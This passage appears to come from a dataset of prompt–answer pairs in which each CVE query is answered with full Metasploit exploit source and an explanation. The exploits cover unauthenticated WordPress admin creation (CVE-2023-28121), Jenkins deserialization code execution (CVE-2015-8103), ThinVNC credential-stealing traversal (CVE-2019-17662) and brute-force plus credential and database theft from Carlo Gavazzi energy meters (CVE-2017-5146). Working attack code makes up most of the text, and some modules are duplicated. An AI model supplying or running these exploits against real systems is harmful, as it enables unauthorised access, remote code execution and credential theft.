'5.4.1'],      ['5.5', '5.5.2'],      ['5.6', '5.6.2']    ]    vuln_versions.each do |versions|      introduced = versions[0]      fixed = versions[1]      checkcode = check_plugin_version_from_readme('woocommerce-payments', fixed, introduced)      if checkcode == Exploit::CheckCode::Appears        return Msf::Exploit::CheckCode::Appears('WooCommerce-Payments version is exploitable')      end    end    Msf::Exploit::CheckCode::Safe('WooCommerce-Payments version not vulnerable or plugin not installed')  end  def run    password = datastore['PASSWORD']    if datastore['PASSWORD'].blank?      password = Rex::Text.rand_text_alphanumeric(10..15)    end    email = datastore['EMAIL']    if datastore['EMAIL'].blank?      email = Rex::Text.rand_mail_address    end    username = datastore['USERNAME']    if datastore['USERNAME'].blank?      username = Rex::Text.rand_text_alphanumeric(5..20)    end    print_status(\"Attempting to create an administrator user -> #{username}:#{password} (#{email})\")    ['/', 'index.php', '/rest'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites      if url_root == '/rest'        res = send_request_cgi({          'uri' => normalize_uri(target_uri.path),          'headers' => { \"X-WCPAY-PLATFORM-CHECKOUT-USER\": datastore['ADMINID'] },          'method' => 'POST',          'ctype' => 'application/json',          'vars_get' => { 'rest_route' => 'wp-json/wp/v2/users' },          'data' => {            'username' => username,            'email' => email,            'password' => password,            'roles' => ['administrator']          }.to_json        })      else        res = send_request_cgi({          'uri' => normalize_uri(target_uri.path, url_root, 'wp-json', 'wp', 'v2', 'users'),          'headers' => { \"X-WCPAY-PLATFORM-CHECKOUT-USER\": datastore['ADMINID'] },          'method' => 'POST',          'ctype' => 'application/json',          'data' => {            'username' => username,            'email' => email,            'password' => password,            'roles' => ['administrator']          }.to_json        })      end      fail_with(Failure::Unreachable, 'Connection failed') unless res      next if res.code == 404      if res.code == 201 && res.body&.match(/\"email\":\"#{email}\"/) && res.body&.match(/\"username\":\"#{username}\"/)        print_good('User was created successfully')        if framework.db.active          create_credential_and_login({            address: rhost,            port: rport,            protocol: 'tcp',            workspace_id: myworkspace_id,            origin_type: :service,            service_name: 'WordPress',            username: username,            private_type: :password,            private_data: password,            module_fullname: fullname,            access_level: 'administrator',            last_attempted_at: DateTime.now,            status: Metasploit::Model::Login::Status::SUCCESSFUL          })        end      else        print_error(\"Server response: #{res.body}\")      end      break # we didn't get a 404 so we can bail on the 2nd attempt    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HTTP::Wordpress  prepend Msf::Exploit::Remote::AutoCheck  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation',        'Description' => %q{          WooCommerce-Payments plugin for Wordpress versions 4.8', '4.8.2, 4.9', '4.9.1,          5.0', '5.0.4, 5.1', '5.1.3, 5.2', '5.2.2, 5.3', '5.3.1, 5.4', '5.4.1,          5.5', '5.5.2, and 5.6', '5.6.2 contain an authentication bypass by specifying a valid user ID number          within the X-WCPAY-PLATFORM-CHECKOUT-USER header. With this authentication bypass, a user can then use the API          to create a new user with administrative privileges on the target WordPress site IF the user ID          selected corresponds to an administrator account.        },        'License' => MSF_LICENSE,        'Author' => [          'h00die', # msf module          'Michael Mazzolini', # original discovery          'Julien Ahrens' # detailed writeup        ],        'References' => [          ['URL', 'https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/'],          ['URL', 'https://developer.woocommerce.com/2023/03/23/critical-vulnerability-detected-in-woocommerce-payments-what-you-need-to-know/'],          ['CVE', '2023-28121']        ],        'DisclosureDate' => '2023-03-22',        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        }      )    )    register_options(      [        Opt::RPORT(80),        OptString.new('USERNAME', [true, 'User to create', '']),        OptString.new('PASSWORD', [false, 'Password to create, random if blank', '']),        OptString.new('EMAIL', [false, 'Email to create, random if blank', '']),        OptInt.new('ADMINID', [false, 'ID Number of a WordPress administrative user', 1]),        OptString.new('TARGETURI', [true, 'The URI of the Wordpress instance', '/'])      ]    )  end  def check    unless wordpress_and_online?      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')    end    vuln_versions = [      ['4.8', '4.8.2'],      ['4.9', '4.9.1'],      ['5.0', '5.0.4'],      ['5.1', '5.1.3'],      ['5.2', '5.2.2'],      ['5.3', '5.3.1'],      ['5.4', '5.4.1'],      ['5.5', '5.5.2'],      ['5.6', '5.6.2']    ]    vuln_versions.each do |versions|      introduced = versions[0]      fixed = versions[1]      checkcode = check_plugin_version_from_readme('woocommerce-payments', fixed, introduced)      if checkcode == Exploit::CheckCode::Appears        return Msf::Exploit::CheckCode::Appears('WooCommerce-Payments version is exploitable')      end    end    Msf::Exploit::CheckCode::Safe('WooCommerce-Payments version not vulnerable or plugin not installed')  end  def run    password = datastore['PASSWORD']    if datastore['PASSWORD'].blank?      password = Rex::Text.rand_text_alphanumeric(10..15)    end    email = datastore['EMAIL']    if datastore['EMAIL'].blank?      email = Rex::Text.rand_mail_address    end    username = datastore['USERNAME']    if datastore['USERNAME'].blank?      username = Rex::Text.rand_text_alphanumeric(5..20)    end    print_status(\"Attempting to create an administrator user -> #{username}:#{password} (#{email})\")    ['/', 'index.php', '/rest'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites      if url_root == '/rest'        res = send_request_cgi({          'uri' => normalize_uri(target_uri.path),          'headers' => { \"X-WCPAY-PLATFORM-CHECKOUT-USER\": datastore['ADMINID'] },          'method' => 'POST',          'ctype' => 'application/json',          'vars_get' => { 'rest_route' => 'wp-json/wp/v2/users' },          'data' => {            'username' => username,            'email' => email,            'password' => password,            'roles' => ['administrator']          }.to_json        })      else        res = send_request_cgi({          'uri' => normalize_uri(target_uri.path, url_root, 'wp-json', 'wp', 'v2', 'users'),          'headers' => { \"X-WCPAY-PLATFORM-CHECKOUT-USER\": datastore['ADMINID'] },          'method' => 'POST',          'ctype' => 'application/json',          'data' => {            'username' => username,            'email' => email,            'password' => password,            'roles' => ['administrator']          }.to_json        })      end      fail_with(Failure::Unreachable, 'Connection failed') unless res      next if res.code == 404      if res.code == 201 && res.body&.match(/\"email\":\"#{email}\"/) && res.body&.match(/\"username\":\"#{username}\"/)        print_good('User was created successfully')        if framework.db.active          create_credential_and_login({            address: rhost,            port: rport,            protocol: 'tcp',            workspace_id: myworkspace_id,            origin_type: :service,            service_name: 'WordPress',            username: username,            private_type: :password,            private_data: password,            module_fullname: fullname,            access_level: 'administrator',            last_attempted_at: DateTime.now,            status: Metasploit::Model::Login::Status::SUCCESSFUL          })        end      else        print_error(\"Server response: #{res.body}\")      end      break # we didn't get a 404 so we can bail on the 2nd attempt    end  endend       Question: CVE-2023-28121[/INST] CVE-2023-28121 refers to a vulnerability in the WooCommerce-Payments plugin for certain versions of WordPress. This vulnerability allows an attacker to bypass authentication and create a new user with administrative privileges on the targeted WordPress site, provided that the specified user ID number corresponds to an existing administrator account.The Metasploit module above demonstrates how to exploit this vulnerability by sending a POST request to the WordPress REST API with a specific user ID number in the X-WCPAY-PLATFORM-CHECKOUT-USER header. If the targeted WordPress installation uses the vulnerable version of the WooCommerce-Payments plugin, the attacker can successfully create a new admin user."}
{"query": "CVE-2015-8103", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Remote  Rank = ExcellentRanking  include Msf::Exploit::Remote::Tcp  include Msf::Exploit::FileDropper  def initialize(info = {})    super(update_info(info,      'Name'           => 'Jenkins CLI RMI Java Deserialization Vulnerability',      'Description'    => %q{        This module exploits a vulnerability in Jenkins. An unsafe deserialization bug exists on        the Jenkins master, which allows remote arbitrary code execution. Authentication is not        required to exploit this vulnerability.      },      'Author'         =>          [            'Christopher Frohoff', # Vulnerability discovery            'Steve Breen',         # Public Exploit            'Dev Mohanty',         # Metasploit module            'Louis Sato',          # Metasploit            'wvu',  # Metasploit            'juan vazquez',        # Metasploit            'Wei Chen'             # Metasploit          ],      'License'        => MSF_LICENSE,      'References'     =>          [            ['CVE', '2015-8103'],            ['URL', 'https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py'],            ['URL', 'https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java'],            ['URL', 'http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability'],            ['URL', 'https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2015-11-11']          ],      'Platform'       => 'java',      'Arch'           => ARCH_JAVA,      'Targets'        =>        [          [ 'Jenkins 1.637', {} ]        ],      'DisclosureDate' => '2015-11-18',      'DefaultTarget' => 0))    register_options([      OptString.new('TARGETURI', [true, 'The base path to Jenkins in order to find X-Jenkins-CLI-Port', '/']),      OptString.new('TEMP', [true, 'Folder to write the payload to', '/tmp']),      Opt::RPORT('8080')    ])    register_advanced_options([      OptPort.new('XJenkinsCliPort', [false, 'The X-Jenkins-CLI port. If this is set, the TARGETURI option is ignored.'])    ])  end  def cli_port    @jenkins_cli_port || datastore['XJenkinsCliPort']  end  def exploit    if cli_port == 0 && !vulnerable?      fail_with(Failure::Unknown, \"#{peer} - Jenkins is not vulnerable, aborting...\")    end    invoke_remote_method(set_payload)    invoke_remote_method(class_load_payload)  end  # This is from the HttpClient mixin. But since this module isn't actually exploiting  # HTTP, the mixin isn't used in order to favor the Tcp mixin (to avoid datastore confusion &  # conflicts). We do need #target_uri and normlaize_uri to properly normalize the path though.  def target_uri    begin      # In case TARGETURI is empty, at least we default to '/'      u = datastore['TARGETURI']      u = \"/\" if u.nil? or u.empty?      URI(u)    rescue ::URI::InvalidURIError      print_error \"Invalid URI: #{datastore['TARGETURI'].inspect}\"      raise Msf::OptionValidateError.new(['TARGETURI'])    end  end  def normalize_uri(*strs)    new_str = strs * \"/\"    new_str = new_str.gsub!(\"//\", \"/\") while new_str.index(\"//\")    # Makes sure there's a starting slash    unless new_str[0,1] == '/'      new_str = '/' + new_str    end    new_str  end  def check    result = Exploit::CheckCode::Safe    begin      if vulnerable?        result = Exploit::CheckCode::Vulnerable      end    rescue Msf::Exploit::Failed => e      vprint_error(e.message)      return Exploit::CheckCode::Unknown    end    result  end  def vulnerable?    res = send_request_cgi({      'uri' => normalize_uri(target_uri.path)    })    unless res      fail_with(Failure::Unknown, 'The connection timed out.')    end    http_headers = res.headers    unless http_headers['X-Jenkins-CLI-Port']      vprint_error('The server does not have the CLI port that is needed for exploitation.')      return false    end    if http_headers['X-Jenkins'] && http_headers['X-Jenkins'].to_f <= 1.637      @jenkins_cli_port = http_headers['X-Jenkins-CLI-Port'].to_i      return true    end    false  end  # Connects to the server, creates a request, sends the request,  # reads the response  #  # Passes +opts+ through directly to Rex::Proto::Http::Client#request_cgi.  #  def send_request_cgi(opts={}, timeout = 20)    if datastore['HttpClientTimeout'] && datastore['HttpClientTimeout'] > 0      actual_timeout = datastore['HttpClientTimeout']    else      actual_timeout =  opts[:timeout] || timeout    end    begin      c = Rex::Proto::Http::Client.new(datastore['RHOST'], datastore['RPORT'])      c.connect      r = c.request_cgi(opts)      c.send_recv(r, actual_timeout)    rescue ::Errno::EPIPE, ::Timeout::Error      nil    end  end  def invoke_remote_method(serialized_java_stream)    begin      socket = connect(true, {'RPORT' => cli_port})      print_status 'Sending headers...'      socket.put(read_bin_file('serialized_jenkins_header'))      vprint_status(socket.recv(1024))      vprint_status(socket.recv(1024))      encoded_payload0 = read_bin_file('serialized_payload_header')      encoded_payload1 = Rex::Text.encode_base64(serialized_java_stream)      encoded_payload2 = read_bin_file('serialized_payload_footer')      encoded_payload = \"#{encoded_payload0}#{encoded_payload1}#{encoded_payload2}\"      print_status \"Sending payload length: #{encoded_payload.length}\"      socket.put(encoded_payload)    ensure      disconnect(socket)    end  end  def print_status(msg='')    super(\"#{rhost}:#{rport} - #{msg}\")  end  #  # Serialized stream generated with:  # https://github.com/dmohanty-r7/ysoserial/blob/stager-payloads/src/main/java/ysoserial/payloads/CommonsCollections3.java  #  def set_payload    stream = Rex::Java::Serialization::Model::Stream.new    handle = File.new(File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2015-8103\", 'serialized_file_writer' ), 'rb')    decoded = stream.decode(handle)    handle.close    inject_payload_into_stream(decoded).encode  end  #  # Serialized stream generated with:  # https://github.com/dmohanty-r7/ysoserial/blob/stager-payloads/src/main/java/ysoserial/payloads/ClassLoaderInvoker.java  #  def class_load_payload    stream = Rex::Java::Serialization::Model::Stream.new    handle = File.new(File.join( Msf::Config.data_directory, 'exploits', 'CVE-2015-8103', 'serialized_class_loader' ), 'rb')    decoded = stream.decode(handle)    handle.close    inject_class_loader_into_stream(decoded).encode  end  def inject_class_loader_into_stream(decoded)    file_name_utf8 = get_array_chain(decoded)          .values[2]          .class_data[0]          .values[1]          .values[0]          .values[0]          .class_data[3]    file_name_utf8.contents = get_random_file_name    file_name_utf8.length = file_name_utf8.contents.length    class_name_utf8 = get_array_chain(decoded)           .values[4]           .class_data[0]           .values[0]    class_name_utf8.contents = 'metasploit.Payload'    class_name_utf8.length = class_name_utf8.contents.length    decoded  end  def get_random_file_name    @random_file_name ||= \"#{Rex::FileUtils.normalize_unix_path(datastore['TEMP'], \"#{rand_text_alpha(4 + rand(4))}.jar\")}\"  end  def inject_payload_into_stream(decoded)    byte_array = get_array_chain(decoded)      .values[2]      .class_data      .last    byte_array.values = payload.encoded.bytes    file_name_utf8 = decoded.references[44].class_data[0]    rnd_fname = get_random_file_name    register_file_for_cleanup(rnd_fname)    file_name_utf8.contents = rnd_fname    file_name_utf8.length = file_name_utf8.contents.length    decoded  end  def get_array_chain(decoded)    object = decoded.contents[0]    lazy_map = object.class_data[1].class_data[0]    chained_transformer = lazy_map.class_data[0]    chained_transformer.class_data[0]  end  def read_bin_file(bin_file_path)    data = ''    File.open(File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2015-8103\", bin_file_path ), 'rb') do |f|      data = f.read    end    data  endend       Question: CVE-2015-8103[/INST] CVE-2015-8103 is a Java deserialization vulnerability affecting Jenkins. This vulnerability allows an attacker to remotely execute arbitrary code on the targeted Jenkins instance without authentication requirements. The exploit involves sending specially crafted serialized objects to the Jenkins Master, leading to the execution of the attacker's payload.In the provided Metasploit module code snippet, you can observe several functions related to this vulnerability:1. `check`: This function performs initial checks to determine if the target is vulnerable to CVE-2015-8103.2. `vulnerable?`: This function sends a request to the Jenkins server to gather necessary header information, including the X-Jenkins-CLI-Port number.3. `send_request_cgi`: This function establishes a connection to the Jenkins server and sends the serialized payload.4. `invoke_remote_method`: This function handles sending the serialized payload to the Jenkins server and receiving the response.5. `set_payload` and `class_load_payload`: These functions generate the serialized payloads used in the exploit.These functions work together to create a successful exploit for CVE-2015-8103."}
{"query": "CVE-2019-17662", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(update_info(info,      'Name'        => 'ThinVNC Directory Traversal',      'Description' => %q{        This module exploits a directory traversal vulnerability in ThinVNC        versions 1.0b1 and prior which allows unauthenticated users to retrieve        arbitrary files, including the ThinVNC configuration file.        This module has been tested successfully on ThinVNC versions 1.0b1        and \"ThinVNC_Latest\" (2018-12-07).      },      'References'  =>        [          ['CVE', '2019-17662'],          ['URL', 'https://github.com/bewest/thinvnc/issues/5'],          ['URL', 'https://github.com/shashankmangal2/Exploits/blob/master/ThinVNC-RemoteAccess/POC.py'],          ['URL', 'https://redteamzone.com/ThinVNC/']        ],      'Author'      =>        [          'jinxbox', # Discovery and PoC          'WarMarX', # PoC          'bcoles'   # metasploit        ],      'DefaultOptions' => { 'RPORT' => 8080 },      'DisclosureDate' => '2019-10-16',      'License' => MSF_LICENSE    ))    register_options(      [        OptString.new('FILEPATH', [true, 'The path to the file to read', 'ThinVnc.ini']),        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 2])      ])  end  def run_host(ip)    depth = datastore['DEPTH']    filepath = datastore['FILEPATH']    res = retrieve_file(depth, filepath)    return if res.blank?    filename = File.basename(filepath)    path = store_loot(      'thinvnc.traversal',      'text/plain',      ip,      res.to_s,      filename    )    print_good(\"File #{filename} saved in: #{path}\")    # Report vuln and store creds if we successfully retrieved the config file    if filename.downcase == 'thinvnc.ini' && res.to_s.start_with?('[Authentication]')      report_service(        :host => ip,        :port => rport,        :sname => (ssl ? 'https' : 'http'),        :info => 'ThinVNC'      )      report_vuln(        :host  => ip,        :port  => rport,        :proto => 'tcp',        :sname => (ssl ? 'https' : 'http'),        :name  => 'ThinVNC Directory Traversal',        :info  => 'ThinVNC Directory Traversal',        :refs  => self.references      )      username = res.scan(/^User=(.+)$/).flatten.first.to_s.strip      password = res.scan(/^Password=(.+)$/).flatten.first.to_s.strip      if username && password        print_good \"Found credentials: #{username}:#{password}\"        store_valid_credential(user: username, private: password)      end    end  end  def retrieve_file(depth, filepath)    traversal = Rex::Text.rand_text_alphanumeric(3..5)    traversal << '/'    traversal << '../' * depth    traversal << filepath    res = send_request_cgi({      'uri' => normalize_uri(target_uri.path, traversal)    })    unless res      vprint_error 'No reply'      return    end    if res.code == 404      vprint_error 'File not found'      return    end    if res.code != 200      vprint_error 'Unexpected reply'      return    end    res.body.to_s  endendEXPLOIT: # Exploit Title: ThinVNC 1.0b1 - Authentication Bypass# Date: 2019-10-17# Exploit Author: Nikhith Tumamlapalli# Contributor WarMarX# Vendor Homepage: https://sourceforge.net/projects/thinvnc/# Software Link: https://sourceforge.net/projects/thinvnc/files/ThinVNC_1.0b1/ThinVNC_1.0b1.zip/download# Version: 1.0b1# Tested on: Windows All Platforms# CVE : CVE-2019-17662# Description:# Authentication Bypass via Arbitrary File Read#!/usr/bin/python3import sysimport osimport requests# Code for: def exploit(host,port):# Code for: def main():if __name__ == '__main__':    main()       Question: CVE-2019-17662[/INST] CVE-2019-17662 is a directory traversal vulnerability affecting ThinVNC versions 1.0b1 and prior. This vulnerability allows unauthenticated users to retrieve arbitrary files, including the ThinVNC configuration file.To exploit this vulnerability, an attacker can craft a malicious request to traverse directories and reach the target file. In the given context, the Metasploit Module named 'ThinVNC Directory Traversal' is designed to exploit this vulnerability.Here's how the Metasploit Module works:1. Initialize the module with necessary options such as FILEPATH (the path to the file to read) and DEPTH (depth for path traversal).2. When the run_host method is triggered, the module attempts to retrieve the specified file using the retrieve_file function.3. The retrieve_file function generates a random string 'traversal' followed by '../' repeated based on the DEPTH option and the FILEPATH. It then sends an HTTP request to the target using the send_request_cgi method with the normalized URI.4. If the file is found, the module saves it in loot and reports the result. Additionally, if the file retrieved is the ThinVNC configuration file ('ThinVnc.ini'), the module prints the service details and vulnerability information along with storing the credentials if present.As mentioned in the text, the vulnerability was discovered by jinxbox and the PoC was developed by WarMarX. The Metasploit Module was contributed by bcoles."}
{"query": "CVE-2017-5146", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::AuthBrute  include Msf::Auxiliary::Scanner  def initialize(info={})    super(update_info(info,      'Name' => 'Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database',      'Description' => %{        This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db. This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.      },      'References' =>        [          ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-012-03'],          ['CVE', '2017-5146']        ],      'Author' =>         [           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'         ],      'License' => MSF_LICENSE,      'DefaultOptions' =>         {           'SSL' => false,           'VERBOSE' => true         }))    register_options(      [        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'admin']),        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'admin'])      ], self.class    )  end  def run_host(ip)    unless is_app_carlogavazzi?      return    end    each_user_pass do |user, pass|      do_login(user, pass)    end    ewplantdb  end  #  # What's the point of running this module if the target actually isn't Carlo Gavazzi box  #  def is_app_carlogavazzi?    begin      res = send_request_cgi(        {          'uri'       => '/',          'method'    => 'GET'        }      )    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")      return false    end    good_response = (      res &&      res.code == 200 &&      res.body.include?('Accedi') || res.body.include?('Gavazzi') || res.body.include?('styleVMUC.css') || res.body.include?('VMUC')    )    if good_response      vprint_good(\"#{rhost}:#{rport} - Running Carlo Gavazzi VMU-C Web Management portal...\")      return true    else      vprint_error(\"#{rhost}:#{rport} - Application is not Carlo Gavazzi. Module will not continue.\")      return false    end  end  def report_cred(opts)    service_data = {      address: opts[:ip],      port: opts[:port],      service_name: opts[:service_name],      protocol: 'tcp',      workspace_id: myworkspace_id    }    credential_data = {      origin_type: :service,      module_fullname: fullname,      username: opts[:user],      private_data: opts[:password],      private_type: :password    }.merge(service_data)    login_data = {      last_attempted_at: Time.now,      core: create_credential(credential_data),      status: Metasploit::Model::Login::Status::SUCCESSFUL,      proof: opts[:proof]    }.merge(service_data)    create_credential_login(login_data)  end  #  # Brute-force the login page  #  def do_login(user, pass)    vprint_status(\"#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}\")    # Set Cookie - Box is vuln to Session Fixation. Generating a random cookie for use.    randomvalue = Rex::Text.rand_text_alphanumeric(26)    cookie_value = 'PHPSESSID=' + \"#{randomvalue}\"    begin      res = send_request_cgi(        {          'uri'       => '/login.php',          'method'    => 'POST',          'headers'   => {            'Cookie' => cookie_value          },          'vars_post' =>            {              'username' => user,              'password' => pass,              'Entra' => 'Sign+In' # Also - 'Entra' => 'Entra' # Seen to vary in some models            }        }      )    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")      return :abort    end    good_response = (      res &&      res.code == 200 &&      res.body.include?('Login in progress') || res.body.include?('Login in corso') &&      res.body.match(/id=\"error\" value=\"2\"/) || (res.code == 302 && res.headers['Location'] == 'disclaimer.php')    )    if good_response      print_good(\"SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")      # Extract firmware version      begin        res = send_request_cgi(          {            'uri' => '/setupfirmware.php',            'method' => 'GET',            'headers' => {              'Cookie' => cookie_value            }          }        )      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE        vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")        return :abort      end      if res && res.code == 200        if res.body.include?('Firmware Version') || res.body.include?('Versione Firmware')          fw_ver = res.body.match(/Ver. (.*)[$<]/)[1]          if !fw_ver.nil?            print_good(\"#{rhost}:#{rport} - Firmware version #{fw_ver}...\")            report_cred(              ip: rhost,              port: rport,              service_name: \"Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver}]\",              user: user,              password: pass            )          end        end      end      #      # Extract SMTP config      #      begin        res = send_request_cgi(          {            'uri'       => '/setupmail.php',            'method'    => 'GET',            'headers'   => {              'Cookie' => cookie_value            }          }        )      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE        vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")        return :abort      end      if (res && res.code == 200 && res.body.include?('SMTP'))        dirty_smtp_server = res.body.match(/smtp\" value=(.*)[$=]/)[1]        dirty_smtp_user = res.body.match(/usersmtp\" value=(.*)[$=]/)[1]        dirty_smtp_pass = res.body.match(/passwordsmtp\" value=(.*)[$=]/)[1]        if (!dirty_smtp_server.nil?) && (!dirty_smtp_user.nil?) && (!dirty_smtp_pass.nil?)          smtp_server = dirty_smtp_server.match(/[$\"](.*)[$\"]/)          smtp_user = dirty_smtp_user.match(/[$\"](.*)[$\"]/)          smtp_pass = dirty_smtp_pass.match(/[$\"](.*)[$\"]/)          if (!smtp_server.nil?) && (!smtp_user.nil?) && (!smtp_pass.nil?)            print_good(\"#{rhost}:#{rport} - SMTP server: #{smtp_server}, SMTP username: #{smtp_user}, SMTP password: #{smtp_pass}\")          end        end      else        vprint_error(\"#{rhost}:#{rport} - SMTP config could not be retrieved. Check if the user has administrative privileges\")      end      return :next_user    else      print_error(\"FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")    end  end  #  # Dump EWplant.db database file - No authentication required  #  def ewplantdb    begin      res = send_request_cgi(        {          'uri' => '/cfg/EWplant.db',          'method' => 'GET'        }      )    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")      return :abort    end    if res && res.code == 200      print_status(\"#{rhost}:#{rport} - dumping EWplant.db\")      print_good(\"#{rhost}:#{rport} - EWplant.db retrieved successfully!\")      loot_name = 'EWplant.db'      loot_type = 'SQLite_db/text'      loot_desc = 'Carlo Gavazzi EM - EWplant.db'      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body , loot_desc)      print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")    else      vprint_error(\"#{rhost}:#{rport} - Failed to retrieve EWplant.db. Set a higher HTTPCLIENTTIMEOUT and try again. Else, check if target is running vulnerable version.?\")      return    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::AuthBrute  include Msf::Auxiliary::Scanner  def initialize(info={})    super(update_info(info,      'Name' => 'Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database',      'Description' => %{        This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db. This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.      },      'References' =>        [          ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-012-03'],          ['CVE', '2017-5146']        ],      'Author' =>         [           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'         ],      'License' => MSF_LICENSE,      'DefaultOptions' =>         {           'SSL' => false,           'VERBOSE' => true         }))    register_options(      [        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'admin']),        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'admin'])      ], self.class    )  end  def run_host(ip)    unless is_app_carlogavazzi?      return    end    each_user_pass do |user, pass|      do_login(user, pass)    end    ewplantdb  end  #  # What's the point of running this module if the target actually isn't Carlo Gavazzi box  #  def is_app_carlogavazzi?    begin      res = send_request_cgi(        {          'uri'       => '/',          'method'    => 'GET'        }      )    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")      return false    end    good_response = (      res &&      res.code == 200 &&      res.body.include?('Accedi') || res.body.include?('Gavazzi') || res.body.include?('styleVMUC.css') || res.body.include?('VMUC')    )    if good_response      vprint_good(\"#{rhost}:#{rport} - Running Carlo Gavazzi VMU-C Web Management portal...\")      return true    else      vprint_error(\"#{rhost}:#{rport} - Application is not Carlo Gavazzi. Module will not continue.\")      return false    end  end  def report_cred(opts)    service_data = {      address: opts[:ip],      port: opts[:port],      service_name: opts[:service_name],      protocol: 'tcp',      workspace_id: myworkspace_id    }    credential_data = {      origin_type: :service,      module_fullname: fullname,      username: opts[:user],      private_data: opts[:password],      private_type: :password    }.merge(service_data)    login_data = {      last_attempted_at: Time.now,      core: create_credential(credential_data),      status: Metasploit::Model::Login::Status::SUCCESSFUL,      proof: opts[:proof]    }.merge(service_data)    create_credential_login(login_data)  end  #  # Brute-force the login page  #  def do_login(user, pass)    vprint_status(\"#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}\")    # Set Cookie - Box is vuln to Session Fixation. Generating a random cookie for use.    randomvalue = Rex::Text.rand_text_alphanumeric(26)    cookie_value = 'PHPSESSID=' + \"#{randomvalue}\"    begin      res = send_request_cgi(        {          'uri'       => '/login.php',          'method'    => 'POST',          'headers'   => {            'Cookie' => cookie_value          },          'vars_post' =>            {              'username' => user,              'password' => pass,              'Entra' => 'Sign+In' # Also - 'Entra' => 